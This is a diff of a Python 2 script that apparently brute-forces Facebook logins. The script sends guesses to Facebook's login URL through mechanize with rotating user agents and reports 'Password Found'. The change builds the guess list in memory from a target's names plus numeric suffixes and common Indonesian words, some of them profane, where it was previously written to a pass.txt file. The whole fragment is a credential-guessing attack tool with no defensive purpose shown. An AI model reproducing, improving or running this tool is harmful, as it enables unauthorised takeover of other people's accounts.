@@ -9,7 +9,7 @@ from useragents import user_agents, string1, string2
 import os, sys, time, random, cookielib, mechanize
 s = '\n  \033[92;1m         Suksess... \n        Password Found '
 multi_dev = []
-
+sandi = []
 def Wordlist():
 
 	try:
@@ -24,21 +24,13 @@ def Wordlist():
 		b = nama2.replace(' ', '').replace('  ', '')
 		open('pass.txt', 'w').write('')
 		lis = ['123','12345','321']
-		v = open('pass.txt', 'a')
-		v.write('sayang\nbismillah\n')
 		# ////////////////////////////////////////////
-		v.write('anjing\nkontol\nbangsat\nbajingan\n')
-		v.close()
 		for dev in lis:
-			p = open('pass.txt', 'a')
-			p.write(nama1+dev+'\n')
-			p.close()
-
+			sandi.append(nama1+dev)
 		for dev in lis:
-			p = open('pass.txt', 'a')
-			p.write(nama2+dev+'\n')
-			p.close()
-
+			sandi.append(nama2+dev)
+		sandi.append('sayang')
+		sandi.append('anjing')
 	except KeyboardInterrupt:
 
 		print "\n Keluar.... "
@@ -59,7 +51,7 @@ dev.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 # DEv = open('word1.txt', 'r').readlines()
 # deV = open('word2.txt', 'r').readlines()
 lol = 'https://www.facebook.com/login.php?login_attempt=1'
-sandi = open('pass.txt', 'r').readlines()
+# sandi = open('pass.txt', 'r').readlines()
 
 
 def target():
